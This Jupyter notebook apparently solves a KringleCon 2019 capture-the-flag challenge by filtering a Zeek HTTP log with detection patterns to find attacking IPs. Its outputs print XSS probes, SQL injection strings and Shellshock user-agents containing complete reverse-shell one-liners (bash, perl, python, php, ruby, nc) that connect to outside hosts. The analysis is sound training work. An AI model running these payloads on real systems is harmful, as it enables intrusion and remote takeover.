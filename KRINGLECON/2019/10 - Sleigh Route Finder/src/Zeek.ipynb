{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "import json\n",
    "pd.set_option('display.max_columns', 0)\n",
    "pd.set_option('display.max_rows', 100)\n",
    "pd.set_option('display.max_colwidth', 0)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "with open('http.log', 'r') as f:\n",
    "    raw = json.load(f)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "55121"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(raw)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "df_dict = {}\n",
    "column_headers = [i for i in raw[0]]\n",
    "for column_header in column_headers:\n",
    "    df_dict[column_header] = [entry[column_header] for entry in raw]\n",
    "df = pd.DataFrame(df_dict)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/plain": [
       "ts                   17110\n",
       "uid                  30597\n",
       "id.orig_h            55117\n",
       "id.orig_p            19516\n",
       "id.resp_h            1    \n",
       "id.resp_p            1    \n",
       "trans_depth          388  \n",
       "method               2    \n",
       "host                 11   \n",
       "uri                  25568\n",
       "referrer             3    \n",
       "version              3    \n",
       "user_agent           4949 \n",
       "origin               3    \n",
       "request_body_len     37   \n",
       "response_body_len    400  \n",
       "status_code          4    \n",
       "status_msg           4    \n",
       "info_code            2    \n",
       "info_msg             2    \n",
       "tags                 1    \n",
       "username             12   \n",
       "password             1    \n",
       "proxied              5    \n",
       "orig_fuids           1320 \n",
       "orig_filenames       1    \n",
       "orig_mime_types      3    \n",
       "resp_fuids           43494\n",
       "resp_filenames       50   \n",
       "resp_mime_types      8    \n",
       "dtype: int64"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.nunique()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "host\n",
       "-                                                               8728 \n",
       "10.20.3.80                                                      8958 \n",
       "<script>alert('automatedscanning');</script>&action=item        1    \n",
       "<script>alert('automatedscanning');</script>&function=search    1    \n",
       "<script>alert(\\\"automatedscanning\\\");</script>                  1    \n",
       "<script>alert(\\\"automatedscanning\\\");</script>&from=add         1    \n",
       "<script>alert(\\\"automatedscanning\\\")</script><img src=\\\"        1    \n",
       "<script>alert(\\\"avdscan-681165131\\\");d('                        1    \n",
       "<script>alert(automatedscanning)</script>                       1    \n",
       "srf.elfu.org                                                    37416\n",
       "ssrf.elfu.org                                                   12   \n",
       "dtype: int64"
      ]
     },
     "execution_count": 6,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.groupby('host').size()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "username\n",
       "' or '1=1    4    \n",
       "(empty)      4    \n",
       "-            55098\n",
       "-r nessus    1    \n",
       "6666         3    \n",
       "Admin        1    \n",
       "admin        4    \n",
       "comcomcom    1    \n",
       "q1ki9        2    \n",
       "root         1    \n",
       "servlet      1    \n",
       "support      1    \n",
       "dtype: int64"
      ]
     },
     "execution_count": 7,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df.groupby('username').size()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>id.orig_h</th>\n",
       "      <th>uri</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>482</th>\n",
       "      <td>56.5.47.137</td>\n",
       "      <td>/logout?id=&lt;script&gt;alert(1400620032)&lt;/script&gt;&amp;ref_a=avdsscanning\\\"&gt;&lt;script&gt;alert(1536286186)&lt;/script&gt;</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1532</th>\n",
       "      <td>19.235.69.221</td>\n",
       "      <td>/api/weather?station_id=&lt;script&gt;alert(1)&lt;/script&gt;.html</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>2514</th>\n",
       "      <td>69.221.145.150</td>\n",
       "      <td>/api/measurements?station_id=&lt;script&gt;alert(60602325)&lt;/script&gt;</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>3520</th>\n",
       "      <td>42.191.112.181</td>\n",
       "      <td>/api/weather?station_id=&lt;script&gt;alert(autmatedsacnningist)&lt;/script&gt;</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>4506</th>\n",
       "      <td>48.66.193.176</td>\n",
       "      <td>/api/weather?station_id=&lt;script&gt;alert(automatedscaning)&lt;/script&gt;</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>5502</th>\n",
       "      <td>49.161.8.58</td>\n",
       "      <td>/api/stations?station_id=&lt;script&gt;alert('automatedscanning')&lt;/script&gt;</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>6482</th>\n",
       "      <td>84.147.231.129</td>\n",
       "      <td>/api/weather?station_id=&lt;script&gt;alert('automatedscanning');&lt;/script&gt;</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>7506</th>\n",
       "      <td>44.74.106.131</td>\n",
       "      <td>/api/stations?station_id=&lt;script&gt;alert(\\\"automatedscanning\\\")&lt;/script&gt;</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>8464</th>\n",
       "      <td>106.93.213.219</td>\n",
       "      <td>/api/weather?station_id=&lt;script&gt;alert(\\\"automatedscanning\\\")&lt;/script&gt;;</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "           id.orig_h                                                                                                    uri\n",
       "482   56.5.47.137     /logout?id=<script>alert(1400620032)</script>&ref_a=avdsscanning\\\"><script>alert(1536286186)</script>\n",
       "1532  19.235.69.221   /api/weather?station_id=<script>alert(1)</script>.html                                               \n",
       "2514  69.221.145.150  /api/measurements?station_id=<script>alert(60602325)</script>                                        \n",
       "3520  42.191.112.181  /api/weather?station_id=<script>alert(autmatedsacnningist)</script>                                  \n",
       "4506  48.66.193.176   /api/weather?station_id=<script>alert(automatedscaning)</script>                                     \n",
       "5502  49.161.8.58     /api/stations?station_id=<script>alert('automatedscanning')</script>                                 \n",
       "6482  84.147.231.129  /api/weather?station_id=<script>alert('automatedscanning');</script>                                 \n",
       "7506  44.74.106.131   /api/stations?station_id=<script>alert(\\\"automatedscanning\\\")</script>                               \n",
       "8464  106.93.213.219  /api/weather?station_id=<script>alert(\\\"automatedscanning\\\")</script>;                               "
      ]
     },
     "execution_count": 8,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "df[(df['uri'].str.contains(\">\", case=False))][['id.orig_h', 'uri']]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [],
   "source": [
    "df1 = df[(df['username'].str.contains(\"'\", case=False)) |\n",
    "         (df['username'].str.contains('\"', case=False)) |\n",
    "         (df['host'].str.contains('script', case=False)) |\n",
    "         (df['user_agent'].str.contains(\"'\", case=False)) |\n",
    "         (df['user_agent'].str.contains('\"', case=False)) |\n",
    "         (df['user_agent'].str.contains('<', case=False)) |\n",
    "         (df['user_agent'].str.contains('>', case=False)) |\n",
    "         (df['user_agent'].str.contains('union', case=False)) |\n",
    "         (df['user_agent'].str.contains('\\\\\\\\', case=False)) |\n",
    "         (df['user_agent'].str.contains('\\\\(\\\\)', case=False)) |\n",
    "         (df['user_agent'].str.contains('\\\\/\\\\*\\\\*\\\\/', case=False)) |\n",
    "         (df['user_agent'].str.contains('/etc/', case=False)) |\n",
    "         (df['user_agent'].str.contains('\\\\|', case=False)) |\n",
    "         (df['user_agent'].str.contains('\\\\(\\\\)\\\\s*\\\\t*\\\\{.*;\\\\s*\\\\}\\\\s*', case=False)) |\n",
    "         (df['uri'].str.contains(\"'\", case=False)) |\n",
    "         (df['uri'].str.contains('\"', case=False)) |\n",
    "         (df['uri'].str.contains('%', case=False)) |\n",
    "         (df['uri'].str.contains('\\\\(\\\\)\\\\s*\\\\t*\\\\{.*;\\\\s*\\\\}\\\\s*', case=False)) |\n",
    "         (df['uri'].str.contains('/\\\\*', case=False)) |\n",
    "         (df['uri'].str.contains(\"\\\\|\", case=False)) |\n",
    "         (df['uri'].str.contains('union', case=False)) |\n",
    "         (df['uri'].str.contains('\\\\/\\\\*\\\\*\\\\/', case=False)) |\n",
    "         (df['uri'].str.contains('<', case=False)) |\n",
    "         (df['uri'].str.contains('>', case=False)) |\n",
    "         (df['uri'].str.contains('\\\\\\\\', case=False)) |\n",
    "         (df['uri'].str.contains('/bin/bash', case=False)) |\n",
    "         (df['uri'].str.contains('/etc/', case=False))]"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "62"
      ]
     },
     "execution_count": 10,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "len(list(set(df1['id.orig_h'].values)))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "42.103.246.250,56.5.47.137,19.235.69.221,69.221.145.150,42.191.112.181,48.66.193.176,49.161.8.58,84.147.231.129,44.74.106.131,106.93.213.219,2.230.60.70,10.155.246.29,225.191.220.138,75.73.228.192,249.34.9.16,27.88.56.114,238.143.78.114,121.7.186.163,106.132.195.153,129.121.121.48,190.245.228.38,34.129.179.28,135.32.99.116,2.240.116.254,45.239.232.245,102.143.16.184,230.246.50.221,131.186.145.73,253.182.102.55,229.133.163.235,23.49.177.78,223.149.180.133,33.132.98.193,84.185.44.166,254.140.181.172,150.50.77.238,187.178.169.123,116.116.98.205,9.206.212.33,28.169.41.122,68.115.251.76,118.196.230.170,173.37.160.150,81.14.204.154,135.203.243.43,186.28.46.179,13.39.153.254,111.81.145.191,0.216.249.31,31.254.228.4,220.132.33.81,83.0.8.119,150.45.133.97,229.229.189.246,227.110.45.126,61.110.82.125,65.153.114.120,123.127.233.97,95.166.116.45,80.244.147.207,168.66.108.62,200.75.228.240\n"
     ]
    }
   ],
   "source": [
    "print(','.join(list(df1['id.orig_h'].values)))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>0</th>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>user_agent</th>\n",
       "      <th></th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.0.5) Gecko/2008121711 Ubuntu/9.04 (jaunty) Firefox/3.0.5</th>\n",
       "      <td>17</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/5.0 (Windows; U; Windows NT 5.2; sk; rv:1.8.1.15) Gecko/20080623 Firefox/2.0.0.15</th>\n",
       "      <td>11</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; fr) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.22</th>\n",
       "      <td>11</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.8) Gecko/20071004 Firefox/2.0.0.8 (Debian-2.0.0.8-1)</th>\n",
       "      <td>10</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/4.0 (compatible;MSIe 7.0;Windows NT 5.1)</th>\n",
       "      <td>5</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1' UNION SELECT 1,concat(0x61,0x76,0x64,0x73,0x73,0x63,0x61,0x6e,0x6e,0x69,0x6e,0x67,,3,4,5,6,7,8 -- '</th>\n",
       "      <td>3</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Wget/1.9+cvs-stable (Red Hat modified)</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/4.0 (compatible; MSIE 7.0; Windos NT 6.0)</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/4.0 (compatible; MSIE6.0; Windows NT 5.1)</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>RookIE/1.0</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Tridents/4.0; .NET CLR 1.1.4322; PeoplePal 7.0; .NET CLR 2.0.50727)</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/4.0 (compatible; MSIE 8.0; Windows MT 6.1; Trident/4.0; .NET CLR 1.1.4322; )</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/4.0 (compatible; MSIE 8.0; Window NT 5.1)</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Tridents/4.0)</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; AntivirXP08; .NET CLR 1.1.4322)</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/4.0 (compatible; MSIE 6.0; Windows NT5.1)</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/4.0 (compatible; MSIE 6.a; Windows NTS)</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/4.0 (compatible; MSIE 6.1; Windows NT6.0)</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/4.0 (compatible; Metasploit RSPEC)</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; .NET CLR 2.0.50727)</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NETS CLR  1.1.4322)</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 500.0)</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/4.0 (compatible MSIE 5.0;Windows_98)</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/4.0 (compatibl; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>HttpBrowser/1.0</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>CholTBAgent</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/4.0 (compatible; MSIEE 7.0; Windows NT 5.1)</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/4.0 (compatible; MSIE 8.0; Windows_NT 5.1; Trident/4.0)</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6.</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) ApleWebKit/525.13 (KHTML, like Gecko) chrome/4.0.221.6 safari/525.13</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Opera/8.81 (Windows-NT 6.1; U; en)</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla4.0 (compatible; MSSIE 8.0; Windows NT 5.1; Trident/5.0)</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/5.0 Windows; U; Windows NT5.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30729)</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/4.0(compatible; MSIE 666.0; Windows NT 5.1</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/5.0 (compatible; MSIE 10.0; W1ndow NT 6.1; Trident/6.0)</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/5.0 (compatible; Goglebot/2.1; +http://www.google.com/bot.html)</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.3) gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30731</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/5.0 WinInet</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/5.0 (Windows NT 6.1; WOW62; rv:53.0) Gecko/20100101 Chrome /53.0</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/5.0 (Windows NT 10.0;Win64;x64)</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/5.0 (Windows NT 5.1 ; v.)</th>\n",
       "      <td>2</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>() { :; }; /bin/bash -i &gt;&amp; /dev/tcp/31.254.228.4/48051 0&gt;&amp;1</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>() { :; }; /usr/bin/perl -e 'use Socket;$i=\"83.0.8.119\";$p=57432;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");};'</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>() { :; }; /usr/bin/php -r '$sock=fsockopen(\"229.229.189.246\",62570);exec(\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>() { :; }; /usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"150.45.133.97\",54611));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>() { :; }; /usr/bin/ruby -rsocket -e'f=TCPSocket.open(\"227.110.45.126\",43870).to_i;exec sprintf(\"/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",f,f,f)'</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1' UNION SELECT '1','2','automatedscanning','1233627891','5'/*</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1' UNION SELECT -1,'autosc','test','O:8:\\\"stdClass\\\":3:{s:3:\\\"mod\\\";s:15:\\\"resourcesmodule\\\";s:3:\\\"src\\\";s:20:\\\"@random41940ceb78dbb\\\";s:3:\\\"int\\\";s:0:\\\"\\\";}',7,0,0,0,0,0,0 /*</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1' UNION SELECT 1,1409605378,1,1,1,1,1,1,1,1/*&amp;blogId=1</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1' UNION SELECT 1729540636,concat(0x61,0x76,0x64,0x73,0x73,0x63,0x61,0x6e,0x65,0x72, --</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1' UNION/**/SELECT/**/1,2,434635502,4/*&amp;blog=1</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>1' UNION/**/SELECT/**/994320606,1,1,1,1,1,1,1/*&amp;blogId=1</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/5.0 (Linux; Android 4.4; Nexus 5 Build/_BuildID_) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/5.0 (Linux; U; Android 4.1.1; en-gb; Build/KLP) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Safari/534.30</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/603.1.23 (KHTML, like Gecko) Version/10.0 Mobile/14E5239e Safari/602.1</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/5.0 (iPhone; CPU iPhone OS 10_3 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) CriOS/56.0.2924.75 Mobile/14E5239e Safari/602.1</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>() { :; }; /bin/bash -c '/bin/nc 55535 220.132.33.81 -e /bin/bash'</th>\n",
       "      <td>1</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                                                                                                                                                                                                                                             0\n",
       "user_agent                                                                                                                                                                                                                                                    \n",
       "Mozilla/5.0 (X11; U; Linux i686; it; rv:1.9.0.5) Gecko/2008121711 Ubuntu/9.04 (jaunty) Firefox/3.0.5                                                                                                                                                        17\n",
       "Mozilla/5.0 (Windows; U; Windows NT 5.2; sk; rv:1.8.1.15) Gecko/20080623 Firefox/2.0.0.15                                                                                                                                                                   11\n",
       "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; fr) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.22                                                                                                                                     11\n",
       "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.8) Gecko/20071004 Firefox/2.0.0.8 (Debian-2.0.0.8-1)                                                                                                                                                       10\n",
       "Mozilla/4.0 (compatible;MSIe 7.0;Windows NT 5.1)                                                                                                                                                                                                            5 \n",
       "1' UNION SELECT 1,concat(0x61,0x76,0x64,0x73,0x73,0x63,0x61,0x6e,0x6e,0x69,0x6e,0x67,,3,4,5,6,7,8 -- '                                                                                                                                                      3 \n",
       "Wget/1.9+cvs-stable (Red Hat modified)                                                                                                                                                                                                                      2 \n",
       "Mozilla/4.0 (compatible; MSIE 7.0; Windos NT 6.0)                                                                                                                                                                                                           2 \n",
       "Mozilla/4.0 (compatible; MSIE6.0; Windows NT 5.1)                                                                                                                                                                                                           2 \n",
       "RookIE/1.0                                                                                                                                                                                                                                                  2 \n",
       "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Tridents/4.0; .NET CLR 1.1.4322; PeoplePal 7.0; .NET CLR 2.0.50727)                                                                                                                                      2 \n",
       "Mozilla/4.0 (compatible; MSIE 8.0; Windows MT 6.1; Trident/4.0; .NET CLR 1.1.4322; )                                                                                                                                                                        2 \n",
       "Mozilla/4.0 (compatible; MSIE 8.0; Window NT 5.1)                                                                                                                                                                                                           2 \n",
       "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Tridents/4.0)                                                                                                                                                                                            2 \n",
       "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; AntivirXP08; .NET CLR 1.1.4322)                                                                                                                                                                          2 \n",
       "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT5.1)                                                                                                                                                                                                           2 \n",
       "Mozilla/4.0 (compatible; MSIE 6.a; Windows NTS)                                                                                                                                                                                                             2 \n",
       "Mozilla/4.0 (compatible; MSIE 6.1; Windows NT6.0)                                                                                                                                                                                                           2 \n",
       "Mozilla/4.0 (compatible; Metasploit RSPEC)                                                                                                                                                                                                                  2 \n",
       "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; .NET CLR 2.0.50727)                                                                                                                                              2 \n",
       "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NETS CLR  1.1.4322)                                                                                                                                                                                     2 \n",
       "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 500.0)                                                                                                                                                                                                       2 \n",
       "Mozilla/4.0 (compatible MSIE 5.0;Windows_98)                                                                                                                                                                                                                2 \n",
       "Mozilla/4.0 (compatibl; MSIE 7.0; Windows NT 6.0; Trident/4.0; SIMBAR={7DB0F6DE-8DE7-4841-9084-28FA914B0F2E}; SLCC1; .N                                                                                                                                     2 \n",
       "HttpBrowser/1.0                                                                                                                                                                                                                                             2 \n",
       "CholTBAgent                                                                                                                                                                                                                                                 2 \n",
       "Mozilla/4.0 (compatible; MSIEE 7.0; Windows NT 5.1)                                                                                                                                                                                                         2 \n",
       "Mozilla/4.0 (compatible; MSIE 8.0; Windows_NT 5.1; Trident/4.0)                                                                                                                                                                                             2 \n",
       "Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6.                                                                                                                                                                                                              2 \n",
       "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) ApleWebKit/525.13 (KHTML, like Gecko) chrome/4.0.221.6 safari/525.13                                                                                                                                        2 \n",
       "Opera/8.81 (Windows-NT 6.1; U; en)                                                                                                                                                                                                                          2 \n",
       "Mozilla4.0 (compatible; MSSIE 8.0; Windows NT 5.1; Trident/5.0)                                                                                                                                                                                             2 \n",
       "Mozilla/5.0 Windows; U; Windows NT5.1; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30729)                                                                                                                                                 2 \n",
       "Mozilla/4.0(compatible; MSIE 666.0; Windows NT 5.1                                                                                                                                                                                                          2 \n",
       "Mozilla/5.0 (compatible; MSIE 10.0; W1ndow NT 6.1; Trident/6.0)                                                                                                                                                                                             2 \n",
       "Mozilla/5.0 (compatible; Goglebot/2.1; +http://www.google.com/bot.html)                                                                                                                                                                                     2 \n",
       "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2.3) gecko/20100401 Firefox/3.6.1 (.NET CLR 3.5.30731                                                                                                                                                2 \n",
